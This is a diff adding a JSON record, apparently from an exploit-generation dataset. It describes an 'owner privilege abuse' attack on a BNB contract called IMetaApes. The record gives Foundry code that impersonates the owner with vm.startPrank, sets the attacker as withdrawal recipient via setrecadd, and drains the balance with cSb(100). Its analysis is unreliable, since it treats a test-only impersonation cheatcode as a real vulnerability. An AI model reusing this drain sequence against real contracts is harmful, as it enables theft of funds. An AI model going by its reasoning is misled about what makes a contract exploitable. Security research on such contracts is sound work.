@@ -1,0 +1,6 @@
+{
+  "vulnerability_context": "An owner privilege abuse vulnerability exists in the target contract. The core flaw is that an attacker can impersonate the publicly-known owner to call privileged functions. This allows them to set their own address as the designated recipient for withdrawals and then drain the entire BNB balance of the contract.",
+  "interface_arsenal": "interface IMetaApes {\n    function getOwner() external view returns (address);\n    function setrecadd(address _mkwa, address _krh, address _mdh, address _wth, address _ext, address _bbk, address _tfu) external;\n    function cSb(uint256 aP) external;\n}",
+  "attack_sequence": "address owner = IMetaApes(TARGET).getOwner();\nvm.startPrank(owner);\nIMetaApes(TARGET).setrecadd(address(0), address(0), address(0), address(0), address(0), address(0), attacker);\nIMetaApes(TARGET).cSb(100);\nvm.stopPrank();",
+  "winning_reflection": "The crucial insight was to leverage the publicly accessible owner's address returned by `getOwner()`. By impersonating this address using `vm.prank`, privileged functions became accessible. The attack hinges on first calling `setrecadd` to control the withdrawal path via its final parameter, and then executing the withdrawal of the entire contract balance by calling `cSb(100)`."
+}
